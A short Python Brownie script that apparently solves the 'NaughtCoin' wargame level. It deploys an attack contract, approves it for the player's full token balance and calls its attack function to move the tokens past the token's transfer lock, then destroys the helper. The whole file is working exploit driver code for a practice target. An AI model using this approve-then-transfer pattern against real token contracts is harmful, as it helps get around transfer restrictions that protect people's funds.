from brownie import accounts, config, interface, NaughtCoinAttack

def main(target):
    coin = interface.IERC20(target)
    hacker = accounts.add(config['wallets']['from_key'])
    assert coin.balanceOf(hacker) != 0
    print(f'Balance: {coin.balanceOf(hacker)}')
    hack = NaughtCoinAttack.deploy(target, {'from': hacker})
    coin.approve(hack, coin.balanceOf(hacker), {'from': hacker})
    assert coin.allowance(hacker, hack) != 0
    hack.attack(hacker, {'from': hacker})
    assert coin.balanceOf(hacker) == 0
    print(f'Balance: {coin.balanceOf(hacker)}')
    hack.destroy({'from': hacker})
